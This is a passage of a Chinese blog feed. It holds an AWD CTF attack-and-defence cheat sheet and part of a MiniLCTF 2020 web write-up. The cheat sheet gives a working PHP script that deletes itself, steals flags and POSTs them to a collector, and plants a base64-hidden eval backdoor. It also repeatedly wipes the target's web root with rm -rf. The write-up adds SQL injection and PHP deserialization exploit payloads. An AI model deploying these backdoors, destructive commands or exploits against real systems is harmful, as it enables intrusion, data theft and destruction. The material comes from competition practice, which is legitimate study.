class=\"token punctuation\">(</span>web_dir<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>GetHash<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>ctime<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token string\">' 安全'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>FileMonitor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 监控间隔，按需修改</span></pre></td></tr></table></figure><h1 id=\"awd线下赛攻击脚本\"><a class=\"anchor\" href=\"#awd线下赛攻击脚本\">#</a> AWD 线下赛攻击脚本：</h1>\n<p>（1）内存马 &amp; 自动获取刷新的 flag</p>\n<p>该脚本功能：</p>\n<p>1. 该脚本为内存脚本，访问一下就自删除，不留痕迹。</p>\n<p>2. 自动读取 flag，并将 flag 提交到指定地址，会自动检测是否更新 flag，只有更新了 flag 才会提交，需要在脚本中修改 flag 物理路径。</p>\n<p>3. 会生成不死马，不死马具有隐藏和欺骗功能。用蚁剑访问 http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5，密码为 a。</p>\n<p>木马原始代码如下（只要别人不知道 key，就没办法黑吃黑）：</p>\n<p><code>&lt;?php $key=$_GET['key'];$keyhash=md5($key);if($keyhash==='c403d59fea33113df44d465aeec336ab') &#123;    eval($_POST['a']);&#125;echo'file not find.';?&gt;</code></p>\n<p>这个只作为备用连接，flag 正常自己提交过来的话就不用管。</p>\n<p>4. 该脚本会不断删除目标的网站源码，别人扣分等于我们加分。</p>\n<p>5. 脚本命名必须为 awd2021.php，若要修改的话需要同步修改下面代码中的文件名。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>function send_post<span class=\"token punctuation\">(</span>$url<span class=\"token punctuation\">,</span> $post_data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$postdata <span class=\"token operator\">=</span> http_build_query<span class=\"token punctuation\">(</span>$post_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$options <span class=\"token operator\">=</span> array<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token string\">'http'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> array<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">'method'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token string\">'header'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'Content-type:application/x-www-form-urlencoded'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token string\">'content'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> $postdata<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token string\">'timeout'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>$context <span class=\"token operator\">=</span> stream_context_create<span class=\"token punctuation\">(</span>$options<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>$result <span class=\"token operator\">=</span> file_get_contents<span class=\"token punctuation\">(</span>$url<span class=\"token punctuation\">,</span> false<span class=\"token punctuation\">,</span> $context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">return</span> $result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>$flag_tmp<span class=\"token operator\">=</span><span class=\"token string\">'flag&#123;xxx&#125;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token decorator annotation punctuation\">@unlink</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'awd2021.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>$flag<span class=\"token operator\">=</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'cat flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>$data<span class=\"token operator\">=</span>array<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token string\">'flag'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> $flag</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>$flag<span class=\"token operator\">!=</span>$flag_tmp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>send_post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://127.0.0.1/getflag.php'</span><span class=\"token punctuation\">,</span> $data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>$flag_tmp<span class=\"token operator\">=</span>$flag<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>$shell<span class=\"token operator\">=</span>base64_decode<span class=\"token punctuation\">(</span><span class=\"token string\">'PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file_exists<span class=\"token punctuation\">(</span><span class=\"token string\">'.c403d59fea33113df44d465aeec336ab.php'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>file_put_contents<span class=\"token punctuation\">(</span><span class=\"token string\">'.c403d59fea33113df44d465aeec336ab.php'</span><span class=\"token punctuation\">,</span> $shell<span class=\"token punctuation\">,</span> FILE_APPEND<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>system<span class=\"token punctuation\">(</span><span class=\"token string\">'rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>?<span class=\"token operator\">></span></pre></td></tr></table></figure><p>（2）服务端接收 flag</p>\n<p>1. 按照往年比赛经验，靶机和我们的电脑是互通的，这个脚本可以本机开一个 phpstudy 跑起来，若不通的话直接放自己的靶机服务器上。</p>\n<p>2. 这个脚本默认名字为 getflag.php，如果修改的话需要修改内存脚本中对应的文件名。</p>\n<p>3. 新的 flag 会源源不断提交过来，在当前目录的 shuoshuren_flag.txt 里面。</p>\n<p><code>&lt;?php$flag=$_POST['flag'];file_put_contents('shuoshuren_flag.txt', $flag.'\\n', FILE_APPEND);?&gt;</code></p>\n<p>（3）自动提交 flag 脚本</p>\n<p>根据往年经验，flag 提交平台是有验证码的，所以这个脚本调用了验证码训练识别模型，达到自动化提交 flag 的目的，平台没有验证码的话就不用识别。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># base python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">GetPic</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 获取验证码并识别，这里会调用我本机的验证码训练识别模型（refer：算命瞎子）</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pic_content<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pic_base64<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pic_content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>data<span class=\"token operator\">=</span><span class=\"token string\">'base64='</span> pic_base64</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>yzm<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://192.168.3.103:8899/base64'</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">return</span> yzm</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token string\">'yzm'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">PostFlag</span><span class=\"token punctuation\">(</span>PostUrl<span class=\"token punctuation\">,</span>PicUrl<span class=\"token punctuation\">,</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 提交 flag</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>flag_list<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>headers<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#请求头需要现场抓包</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">for</span> flag <span class=\"token keyword\">in</span> flag_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> flag <span class=\"token keyword\">in</span> flag_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; 重复'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>GetYzm<span class=\"token operator\">=</span>GetPic<span class=\"token punctuation\">(</span>PicUrl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'请求体需要现场抓包，字典格式'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>res<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>PostUrl<span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token string\">'成功的标识符'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; 提交成功'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>flag_list_ok<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125; 提交失败'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'其他错误'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>flag_list_ok<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>PostFlag<span class=\"token punctuation\">(</span><span class=\"token string\">'提交flag的请求地址'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'flag平台验证码的地址'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'shuoshuren_flag.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#休息 5 分钟，可以按需修改</span></pre></td></tr></table></figure><h1 id=\"备份网站\"><a class=\"anchor\" href=\"#备份网站\">#</a> 备份网站</h1>\n<p>scp -r <span class=\"exturl\" data-url=\"bWFpbHRvOnJvb3RAMTI3LjAuMC4x\">root@127.0.0.1</span>:/www/html ./   下载远程的 /www/html 到当前的目录</p>\n<p>scp -r testfile <span class=\"exturl\" data-url=\"bWFpbHRvOnJvb3RAMTI3LjAuMC4x\">root@127.0.0.1</span>:/www/html    把当前目录的 testfile 上传到远程的 /www/html</p>\n<h1 id=\"查看已建立的网络连接以及对应进程\"><a class=\"anchor\" href=\"#查看已建立的网络连接以及对应进程\">#</a> 查看已建立的网络连接以及对应进程</h1>\n<p>​\tnetstat -antulp | grep EST</p>\n<h1 id=\"用户管理\"><a class=\"anchor\" href=\"#用户管理\">#</a> 用户管理</h1>\n<p>​\twhoami　　// 查看当前用户<br />\n​\tpkill -kill -t &lt;用户 tty&gt;　　 // 踢掉当前登录用户</p>\n<h1 id=\"进程管理\"><a class=\"anchor\" href=\"#进程管理\">#</a> 进程管理</h1>\n<p>​\t查看进程信息<br />\n​\tps aux | grep pid 或者进程名　　<br />\n​</p>\n<pre><code>查看指定端口被哪个进程占用\nlsof -i:端口号 \n或者 netstat -tunlp|grep 端口号\n\n结束进程命令\nkill PID\nkillall &lt;进程名&gt;\nkill -9 &lt;PID&gt;\n</code></pre>\n<h1 id=\"iptables命令\"><a class=\"anchor\" href=\"#iptables命令\">#</a> iptables 命令</h1>\n<p>​\t封杀某个 IP 或者 ip 段，如：123.4.5.6<br />\n​\tiptables -I INPUT -s 123.4.5.6 -j DROP<br />\n​\tiptables -I INPUT -s 123.4.5.1/24 -j DROP<br />\n​</p>\n<pre><code>禁止从某个主机ssh远程访问登陆到本机，如123.4.5.6\niptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP\n</code></pre>\n<h1 id=\"mysql数据库操作\"><a class=\"anchor\" href=\"#mysql数据库操作\">#</a> Mysql 数据库操作</h1>\n<pre><code>备份mysql数据库\nmysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　//备份指定数据库\nmysqldump --all-databases &gt; bak.sql　　　　//备份所有数据库\n\n还原mysql数据库\nmysql -u 用户名 -p 密码 数据库名 &lt; bak.sql\n</code></pre>\n<h1 id=\"安全检查\"><a class=\"anchor\" href=\"#安全检查\">#</a> 安全检查</h1>\n<pre><code>find / *.php -perm 4777 　　 //查找777的权限的php文件 \nawk -F: '&#123;if($3==0)print $1&#125;' /etc/passwd　　//查看root权限的账号\ncrontab -l　　//查看计划任务\n\n检测所有的tcp连接数量及状态\nnetstat -ant|awk '&#123;print $5 &quot;\\t&quot; $6&#125;' |grep &quot;[1-9][0-9]*\\.&quot;|sed -e 's/::ffff://' -e 's/:[0-9]*//'|sort|uniq -c|sort -rn\n　　\n查看页面访问排名前十的IP\ncat /var/log/apache2/access.log  | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10\n　　\n查看页面访问排名前十的URL\ncat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　\n</code></pre>\n<p></p>\n<h1 id=\"改密码\"><a class=\"anchor\" href=\"#改密码\">#</a> 改密码</h1>\n<p>passwd</p>\n<h1 id=\"后门用户\"><a class=\"anchor\" href=\"#后门用户\">#</a> 后门用户</h1>\n<p>cat /etc/passwd | grep bash<br />\nuserdel hack<br />\nuserdel backdoor</p>\n<h1 id=\"备份\"><a class=\"anchor\" href=\"#备份\">#</a> 备份</h1>\n<p>scp -r root@127.0.01:/var/www/html ./<br />\nscp testfile <span class=\"exturl\" data-url=\"bWFpbHRvOnJvb3RAMTI3LjAuMC4x\">root@127.0.0.1</span>:/var/www/html</p>\n<p>mysql -u root -h localhost -p<br />\nmysqldump TBNAME &gt; ~/tbname.sql</p>\n<h1 id=\"改php数据库密码\"><a class=\"anchor\" href=\"#改php数据库密码\">#</a> 改 php 数据库密码</h1>\n<p>方法一：update mysql.users set password=password (&quot;123..com&quot;) where user = 'check';<br />\nflush privileges;</p>\n<p>方法二：set password for root@localhost = password ('123..com');</p>\n<p>SELECT user,host FROM mysql.user;<br />\nuse mysql;<br />\nupdate user set host='localhost' where user='root';<br />\nflush privileges;</p>\n<h1 id=\"通防\"><a class=\"anchor\" href=\"#通防\">#</a> 通防</h1>\n<p>// 通过 winscp，等方式，将 cwphp.php 通防脚本放到 /var/www/html<br />\ncd /var/www/html<br />\nfind -name '*.php' -exec sed -i &quot;1i &lt;?php @include_once('/var/www/html/cwphp.php');?&gt;&quot; {} ;</p>\n<h1 id=\"查端口禁用\"><a class=\"anchor\" href=\"#查端口禁用\">#</a> 查端口，禁用</h1>\n<p>netstat -antulp<br />\niptables -I INPUT -p tcp --dprot 22 -j DROP</p>\n<h1 id=\"找简单漏洞\"><a class=\"anchor\" href=\"#找简单漏洞\">#</a> 找简单漏洞</h1>\n<p>grep -rl eval /var/www/html<br />\neval base64 system file_get_contents readfile fopen<br />\nfind . -name '<em>.php' | xargs grep -n 'eval('<br />\nfind . -name '</em>.php' | xargs grep -n 'assert('<br />\nfind . -name '*.php' | xargs grep -n 'system('</p>\n<h1 id=\"查端口禁用-2\"><a class=\"anchor\" href=\"#查端口禁用-2\">#</a> 查端口禁用</h1>\n<p>netstat -antulp<br />\niptables -I INPUT -p tcp --dprot 22 -j DROP</p>\n<p>再推荐一篇安全应急排查手册：<span class=\"exturl\" data-url=\"aHR0cHM6Ly95cS5hbGl5dW4uY29tL2FydGljbGVzLzE3NzMzNw==\">https://yq.aliyun.com/articles/177337</span></p>\n<p>部分来自 http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml</p>\n",
            "tags": [
                "computer-science",
                "CTF"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/MiniLCTF_2020%E9%A2%98%E8%A7%A3/",
            "url": "https://zephyr-cyber.github.io.git/MiniLCTF_2020%E9%A2%98%E8%A7%A3/",
            "title": "MiniLCTF_2020题解",
            "date_published": "2021-12-15T07:02:24.002Z",
            "content_html": "<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYueGlkaWFuLmVkdS5jbi9jaGFsbGVuZ2Vz\">平台</span>上只有 web 的题目，只写了 web。比赛的时候应该还有其他的。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIwL3RyZWUvbWFpbi9NaXNj\">西电的信息安全协会里有题目</span>，<s>什么时候复现一下</s></p>\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h3 id=\"id_wife\"><a class=\"anchor\" href=\"#id_wife\">#</a> id_wife</h3>\n<p>好像根据 BUUCTF 的那个随便注改的吧？之前我也写过那个题的 wp. 但最开始没想到堆叠注入，试了挺多方法写脚本跑一下库名表名，最后得到了库名 miniL，没跑出来表名，这个就是用二分法不断的尝试</p>\n<pre><code>id=1') or (ascii(substr(database(),1,1)))&lt;150#\n</code></pre>\n<p>后来想起来应该是堆叠注入，得到了俩表 user 和 1145141919810，查看下内容</p>\n<pre><code>id=1') or (ascii(substr(database(),1,1)))&lt;150;show columns from `user`;\nid=1') or (ascii(substr(database(),1,1)))&lt;150;show columns from `1145141919810`;\n</code></pre>\n<p>然后查看列在 1145141919810 中看到了 content（flag 也应该在这里） 在 mysql 中支持预编译可以绕过很多种限制，本题中由于可以使用堆叠查询，并且需要使用 SELECT 关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。<br />\n在 sql 中我们运用如下语句预编译：</p>\n<pre><code>set @sql=CONCAT('sele','ct content from `1145141919810`');\nprepare payload from @sql;\nexecute payload;\ndeallocate prepare payload;\n</code></pre>\n<p>做到最后一个 hint：strstr（）是提示我们大小写的，多试着改几次</p>\n<pre><code>id=1') or (ascii(substr(database(),4,1)))=105;SET @SQL=CONCAT('sele','ct content From `1145141919810`'); PREPARE PAYLOAD FROM @sql;EXECUTE Payload;Deallocate prePare payload;Show Columns From `1145141919810` ;#\n</code></pre>\n<p>然后就可以拿到 flag 了（发现怎么还有个假的？？？emmmm）</p>\n<h3 id=\"p\"><a class=\"anchor\" href=\"#p\">#</a> P</h3>\n<p>发现将 cookie 两部处理后传入 file，将 cookie 里的 gitbase64decode 一下</p>\n<pre><code>O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;&#125;\n</code></pre>\n<p>改成 <code>O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;classes.php&quot;;&#125;</code></p>\n<p>最后的__wakeup 魔术方法可以用 php 反序列化的 CVE-2016-7124 绕过。看 github，是要传参 cmd 执行，但是过滤了一大堆东西，发现 preg_match 里唯独保留了 P，此题题目也是 P，想到看过的一篇文章，利用执行上传的临时文件 tmp/phpXXXXXX，原文地址 https://www.anquanke.com/post/id/201136</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>git <span class=\"token operator\">=</span> <span class=\"token string\">'O:6:\"github\":3:&#123;s:4:\"file\";s:9:\"index.php\";s:3:\"cmd\";s:26:\"?>&lt;?=`. /??p/p?p??????`;?>\";&#125;'</span><span class=\"token comment\">#反引号不输出，用 & lt;?= 代替 & lt;?php echo 输出</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>git <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>git<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>cookies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'git'</span><span class=\"token punctuation\">:</span> git<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>files <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'#!/bin/sh\\ncat /* | grep minil'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>a <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>cookies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"签-到-题\"><a class=\"anchor\" href=\"#签-到-题\">#</a> 签 到 题</h3>\n<p>ls / 看到了 flag 和 readflag，然后看了可用的 bash，有 sh 和 ash，不知道 ash 有什么用，</p>\n<p>/readflag 返回 <code>do you want the flag?</code>  ，后来🐧说 frk 喜欢考察 linux，或许是交互回复一个 yes? 找了一下可以交互的函数，找到了<strong> proc_open</strong>，查了下函数的用法，一开始用 Yes 没用，试了下 y 有回显，到最后出来一个式子，不知道可不可以用正则，刷新了一下发现有重复的算式，就跑个循环吧，构造如下 exp，核心是 <code>y\\ny\\n120\\n</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td 